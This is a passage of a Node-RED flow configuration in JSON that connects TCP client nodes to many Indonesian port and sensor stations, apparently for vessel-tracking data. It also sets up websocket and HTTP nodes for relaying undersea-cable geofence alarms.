    },
    {
        "id": "bc71ba9e1efa6f62",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "bitung",
        "server": "client",
        "host": "103.206.168.132",
        "port": "5233",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 640,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "04b63bebcf3ea780",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "cilacap",
        "server": "client",
        "host": "202.150.138.45",
        "port": "8331",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 700,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "33113e03a1b4bb52",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "sabang",
        "server": "client",
        "host": "27.124.93.154",
        "port": "8051",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 760,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "62ccf5c749eacc58",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "Jemur",
        "server": "client",
        "host": "36.94.86.22",
        "port": "18240",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 820,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "4387be1fe2769e43",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "Sair",
        "server": "client",
        "host": "36.94.86.22",
        "port": "18340",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 880,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "ca918afb0ad3f67f",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "Palembang",
        "server": "client",
        "host": "103.153.150.69",
        "port": "8030",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 90,
        "y": 940,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "109dabde5a169737",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "Sorong",
        "server": "client",
        "host": "36.64.173.226",
        "port": "8031",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 1000,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "d4112ada2ddd70a4",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "Banjarmasin",
        "server": "client",
        "host": "36.66.225.50",
        "port": "9001",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 90,
        "y": 1060,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "c8193693f0c2e54b",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "merak",
        "server": "client",
        "host": "103.140.130.124",
        "port": "7780",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 1120,
        "wires": [
            [
                "79a68e383a84f592",
                "bf325ab1172f2c34"
            ]
        ]
    },
    {
        "id": "2ddbb47e2d9f658e",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "batulicin",
        "server": "client",
        "host": "36.66.225.44",
        "port": "8030",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 1180,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "3c23309f3ebd1cdc",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "kuala tanjung",
        "server": "client",
        "host": "36.66.34.62",
        "port": "7040",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 90,
        "y": 1240,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "494bde2ab4adb1a4",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "tarakan",
        "server": "client",
        "host": "103.206.168.132",
        "port": "5234",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 1300,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "e67b6a6b41e70c4d",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "ule_lheue",
        "server": "client",
        "host": "36.66.34.61",
        "port": "18031",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 1360,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "3fcdccc7bc5035e8",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "meulaboh",
        "server": "client",
        "host": "36.66.34.61",
        "port": "28031",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 1420,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "1ee2278473d89df7",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "surabaya",
        "server": "client",
        "host": "103.235.153.131",
        "port": "5233",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 1480,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "5e513da3dd4d8470",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "lembar",
        "server": "client",
        "host": "180.250.186.206",
        "port": "8030",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 1540,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "5a800f6f6d452e6c",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "samarinda",
        "server": "client",
        "host": "36.89.246.162",
        "port": "8030",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 1600,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "b436cd5543bdefc1",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "kuala_langsa",
        "server": "client",
        "host": "36.66.34.62",
        "port": "9040",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 90,
        "y": 1660,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "e15e47177ca6900b",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "pangkalan susu",
        "server": "client",
        "host": "36.66.34.62",
        "port": "8040",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 100,
        "y": 1720,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "34ef2cbe088d4834",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "ais sat",
        "server": "client",
        "host": "10.200.24.24",
        "port": "8051",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 1780,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "f405e4457ca5d9a2",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "pontianak",
        "server": "client",
        "host": "36.67.114.236",
        "port": "8030",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 1840,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "30e0695044354ef8",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "bitung",
        "server": "client",
        "host": "103.206.168.132",
        "port": "5233",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 1900,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "07acc4be99a190df",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "karimunjawa",
        "server": "client",
        "host": "36.66.34.61",
        "port": "5340",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 90,
        "y": 1960,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "8b77d82e14482acc",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "tegal",
        "server": "client",
        "host": "36.66.34.61",
        "port": "5240",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 2020,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "8da4034e11c05767",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "semarang",
        "server": "client",
        "host": "103.17.244.71",
        "port": "8040",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 2080,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "3f012ec8c8b4ba64",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "jepara",
        "server": "client",
        "host": "36.66.34.61",
        "port": "5140",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 2140,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "455ecae608917393",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "cilacap",
        "server": "client",
        "host": "202.150.138.45",
        "port": "8331",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 2200,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "667e703bf29069d0",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "pare pare",
        "server": "client",
        "host": "parepare.ddns.net",
        "port": "4712",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 2260,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "3638c591f34315ae",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "selayar",
        "server": "client",
        "host": "selayar.ddns.net",
        "port": "4712",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 2320,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "af495fea019e84c7",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "sabang",
        "server": "client",
        "host": "27.124.93.154",
        "port": "8051",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 2380,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "4f18b679420e4271",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "lps merak",
        "server": "client",
        "host": "51.79.190.90",
        "port": "49201",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 2440,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "ce0506e72631ddce",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "lps bakauheni",
        "server": "client",
        "host": "51.79.190.89",
        "port": "49201",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 90,
        "y": 2500,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "423293a4f2415114",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "tanjung_santan",
        "server": "client",
        "host": "36.95.249.135",
        "port": "8040",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 100,
        "y": 2560,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "78712b3c768b410b",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "lps gilimanuk",
        "server": "client",
        "host": "51.79.212.109",
        "port": "49201",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 90,
        "y": 2620,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "f8d86a0d61beaf9c",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "ketapang",
        "server": "client",
        "host": "36.67.114.236",
        "port": "18270",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 2680,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "1e301c326ac814bc",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "name": "lps ketapang",
        "server": "client",
        "host": "51.79.212.107",
        "port": "49201",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 90,
        "y": 2740,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "84e1a0449db9b47d",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "balikpapan",
        "server": "client",
        "host": "36.95.98.197",
        "port": "8030",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 2800,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "7bd45fc2db2da01d",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "teluk bayur",
        "server": "client",
        "host": "36.92.176.74",
        "port": "5001",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 80,
        "y": 2860,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "c53fa34f1b7bcb2f",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "dumai",
        "server": "client",
        "host": "27.124.93.154",
        "port": "7777",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 2920,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "3515a8e8437e54fb",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "lps_merak_ivef",
        "server": "client",
        "host": "51.79.190.90",
        "port": "7091",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 100,
        "y": 2980,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "3eb88bcd557aa340",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "lps_ketapang_ivef",
        "server": "client",
        "host": "51.79.190.90",
        "port": "7091",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 110,
        "y": 3040,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "29296bc4ce88ca16",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "sensor_site_muara_pegah",
        "server": "client",
        "host": "36.89.246.162",
        "port": "8030",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 130,
        "y": 3100,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "b82510aa741f9aac",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "sensor_site_anggana",
        "server": "client",
        "host": "36.89.246.162",
        "port": "8040",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 120,
        "y": 3160,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "1f75ac3ab2242665",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "sensor_site_mangkalihat",
        "server": "client",
        "host": "180.250.196.141",
        "port": "8040",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 130,
        "y": 3220,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "f78ed102bd5b761f",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "srop_tapaktuan",
        "server": "client",
        "host": "36.66.34.61",
        "port": "38031",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 100,
        "y": 3280,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "9c2250ab5168b89e",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "jambi",
        "server": "client",
        "host": "103.153.150.69",
        "port": "8012",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 3340,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "21a630df3fc0fb20",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "pangkal_balam",
        "server": "client",
        "host": "103.153.150.69",
        "port": "8099",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 100,
        "y": 3400,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "1ce901248c999263",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "tanjung_pandan",
        "server": "client",
        "host": "103.153.150.69",
        "port": "8117",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 100,
        "y": 3460,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "e40f1d51d66ff2d9",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "selat_panjang",
        "server": "client",
        "host": "36.94.86.22",
        "port": "18140",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 90,
        "y": 3520,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "3bce91fa37ba5e4e",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "pulau_jemur",
        "server": "client",
        "host": "36.94.86.22",
        "port": "18240",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 90,
        "y": 3580,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "94239e1b54a96a12",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "tanjung_sair",
        "server": "client",
        "host": "36.94.86.22",
        "port": "18340",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 90,
        "y": 3640,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "fc162e1e1974b837",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "tanjung_parit",
        "server": "client",
        "host": "36.94.86.22",
        "port": "18440",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 90,
        "y": 3700,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "786e14d8030aa4b1",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "tanjung_medang",
        "server": "client",
        "host": "36.94.86.22",
        "port": "18540",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 100,
        "y": 3760,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "2e43f7677787a47f",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "tanjung_intan",
        "server": "client",
        "host": "36.67.114.236",
        "port": "8040",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 90,
        "y": 3820,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "caa9338c1d48ec32",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "sintete",
        "server": "client",
        "host": "36.67.114.236",
        "port": "18370",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 3880,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "9eb80747a9c60de7",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "ajibata",
        "server": "client",
        "host": "51.79.190.87",
        "port": "5234",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 3940,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "7bb49b852546afa4",
        "type": "tcp in",
        "z": "5bcb44ebef548647",
        "d": true,
        "name": "muntok",
        "server": "client",
        "host": "103.153.150.69",
        "port": "8095",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "base64": false,
        "x": 70,
        "y": 4000,
        "wires": [
            [
                "79a68e383a84f592"
            ]
        ]
    },
    {
        "id": "37c9e04605ae57c1",
        "type": "delay",
        "z": "5bcb44ebef548647",
        "name": "",
        "pauseType": "rate",
        "timeout": "5",
        "timeoutUnits": "seconds",
        "rate": "3",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": true,
        "allowrate": false,
        "outputs": 1,
        "x": 430,
        "y": 320,
        "wires": [
            [
                "32573320f6879891"
            ]
        ]
    },
    {
        "id": "648ad1c13d8e7413",
        "type": "debug",
        "z": "5bcb44ebef548647",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 280,
        "y": 160,
        "wires": []
    },
    {
        "id": "bf325ab1172f2c34",
        "type": "debug",
        "z": "5bcb44ebef548647",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 320,
        "y": 1140,
        "wires": []
    },
    {
        "id": "b12fd4c0324a3d85",
        "type": "inject",
        "z": "07d42c4895448327",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "Ocean Inside Kabel Laut Geofence",
        "payloadType": "str",
        "x": 260,
        "y": 100,
        "wires": [
            [
                "0507833ee3826ece"
            ]
        ]
    },
    {
        "id": "0507833ee3826ece",
        "type": "websocket out",
        "z": "07d42c4895448327",
        "name": "",
        "server": "568fbd90132245c7",
        "client": "",
        "x": 500,
        "y": 100,
        "wires": []
    },
    {
        "id": "7696523b5e97b90f",
        "type": "http in",
        "z": "07d42c4895448327",
        "name": "",
        "url": "/sendgeofencealarm",
        "method": "post",
        "upload": false,
        "swaggerDoc": "",
        "x": 290,
        "y": 200,
        "wires": [
            [
                "082a12d1e8d35e13",
                "c1bd8be0cfa87ce5"
            ]
        ]
    },
    {
        "id": "082a12d1e8d35e13",
        "type": "http response",
        "z": "07d42c4895448327",
        "name": "",
        "statusCode": "200",
        "headers": {},
        "x": 560,
        "y": 260,
        "wires": []
    },
    {
        "id": "9324494b7c952edd",
        "type": "websocket out",
        "z": "07d42c4895448327",
        "name": "",
        "server": "568fbd90132245c7",
        "client": "",
        "x": 770,
        "y": 320,
        "wires": []
    },
    {
        "id": "c1bd8be0cfa87ce5",
        "type": "change",
        "z": "07d42c4895448327",
        "name": "",
        "rules": [
            {
                "t": "move",
                "p": "payload.msg",
                "pt": "msg",
                "to": "payload",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 530,
        "y": 320,
        "wires": [
            [
                "9324494b7c952edd",
                "dabaf47753121232"
            ]
        ]
    },
    {
        "id": "dabaf47753121232",
        "type": "debug",
        "z": "07d42c4895448327",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 740,
        "y": 420,
        "wires": []
    }
]